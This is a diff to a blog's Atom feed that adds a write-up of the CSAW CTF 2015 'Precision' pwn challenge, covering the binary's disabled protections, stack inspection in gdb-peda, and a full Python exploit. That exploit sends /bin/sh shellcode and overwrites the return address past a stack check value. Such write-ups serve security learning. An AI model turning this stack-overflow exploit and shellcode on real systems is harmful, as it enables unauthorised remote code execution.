@@ -4,7 +4,7 @@
   <title><![CDATA[punMag]]></title>
   <link href="http://tungpun.github.io/atom.xml" rel="self"/>
   <link href="http://tungpun.github.io/"/>
-  <updated>2015-09-09T16:21:59+00:00</updated>
+  <updated>2015-09-22T16:22:27+00:00</updated>
   <id>http://tungpun.github.io/</id>
   <author>
     <name><![CDATA[Tung Pun]]></name>
@@ -12,6 +12,172 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Writeup | CSAW CTF 2015 - Pwn - Precision]]></title>
+    <link href="http://tungpun.github.io/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision/"/>
+    <updated>2015-09-22T15:18:44+00:00</updated>
+    <id>http://tungpun.github.io/blog/2015/09/22/writeup-csaw-ctf-2015-pwn-precision</id>
+    <content type="html"><![CDATA[<pre><code>nc 54.210.15.77 1259
+Updated again!
+</code></pre>
+
+<p><a href="https://ctf.isis.poly.edu/static/uploads/42bf99ba903b051923e707ba422f068a/precision_a8f6f0590c177948fe06c76a1831e650">precision_a8f6f0590c177948fe06c76a1831e650</a></p>
+
+<p>Download binary file, open with IDA and HexRay, i have:</p>
+
+<p><img src="http://i.imgur.com/9J3MUqz.jpg" alt="IDA" /></p>
+
+<p>Program prompts user to input a string, then saved to v4.
+Seem like there is a buffer over flow here.
+So, we should fill the junk data to the string then overwrite return address to execute shellcode.</p>
+
+<p>Check security, using <code>checksec</code> in <code>gdb-peda</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ gdb precision
+</span><span class='line'>Reading symbols from precision...(no debugging symbols found)...done.
+</span><span class='line'>gdb-peda$ checksec
+</span><span class='line'>CANARY    : disabled
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : disabled
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : Partial
+</span><span class='line'>gdb-peda$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nice.</p>
+
+<p>Have a look at the below code again, we can calculate the length of string (0x80 or 128)</p>
+
+<p>However, we have other issue. The program uses v5 to verify and avoid overflowing the buffer.
+I use gdb-peda to view stack, find out the value which is used to verify.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/80xw $sp
+</span><span class='line'>0xffffd5c0:     0x08048682      0xffffd5d8      0x00000002      0x00000000
+</span><span class='line'>0xffffd5d0:     0xffffd60e      0x00000001      0x41414141      0x41414141
+</span><span class='line'>0xffffd5e0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd5f0:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd600:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd610:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd620:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd630:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd640:     0x41414141      0x41414141      0x41414141      0x41414141
+</span><span class='line'>0xffffd650:     0x41414141      0x41414141      0x475a3100      0x40501555
+</span><span class='line'>0xffffd660:     0x00000000      0xf7fc8000      0x00000000      0xf7e29497  &lt;- [return address]
+</span><span class='line'>0xffffd670:     0x00000001      0xffffd704      0xffffd70c      0x00000000
+</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I use the following 24 bytes to append 128 junk bytes of payload
+<code>0x475a31a5      0x40501555    0x00000000      0xf7fc8000      0x00000000     [new-return-address]</code></p>
+
+<p>What is &lsquo;new-return-address&rsquo; ?
+Do you remember the gift, which program give us everytime we try to run the binary ? It is address of first byte of payload. So, we can put our shellcode there, and put that address to <code>new-return-address</code></p>
+
+<p>Just some pieces of code more:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#!/usr/bin/env python 2.7
+</span><span class='line'>
+</span><span class='line'>#from hexdump import hexdump
+</span><span class='line'>import socket
+</span><span class='line'>import telnetlib
+</span><span class='line'>import struct
+</span><span class='line'>
+</span><span class='line'>p = lambda x: struct.pack("I", x)
+</span><span class='line'>P = lambda x: struct.unpack("I", x)
+</span><span class='line'>q = lambda x: struct.pack("&lt;Q", x)
+</span><span class='line'>
+</span><span class='line'>def interact():
+</span><span class='line'>    t = telnetlib.Telnet()
+</span><span class='line'>    t.sock = s
+</span><span class='line'>    t.interact()
+</span><span class='line'>
+</span><span class='line'>def r_until(st, debug=False):
+</span><span class='line'>    ret = ""
+</span><span class='line'>    while st not in ret:
+</span><span class='line'>        lret = s.recv(8192)
+</span><span class='line'>        if debug and len(lret) &gt; 0:
+</span><span class='line'>            print lret
+</span><span class='line'>        ret += lret
+</span><span class='line'>    return ret
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>    s = socket.create_connection(('54.173.98.115', '1259'))    
+</span><span class='line'>    data = s.recv(1024)
+</span><span class='line'>    addr = data[6:-1]
+</span><span class='line'>    
+</span><span class='line'>    shellcode =  "\x31\xc0\xb0\x30\x01\xc4\x30\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\xb0\xc0\xe8\x04\xcd\x80\xc0\xe8\x03\xcd\x80"
+</span><span class='line'>    junk = shellcode + '1' * (128 - len(shellcode))
+</span><span class='line'>
+</span><span class='line'>    payload = junk + p(0x475a31a5) + p(0x40501555) + "\x00" * 4 + p(0xf7fc8000) + "\x00" * 4 + p(int(addr, 16))
+</span><span class='line'>    s.send(payload + '\n')
+</span><span class='line'>    interact()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Get your point !</p>
+
+<p><em>Thanks for the great help from my brother</em></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Write Up | MMACTF 2015 - Pwn - RPS]]></title>
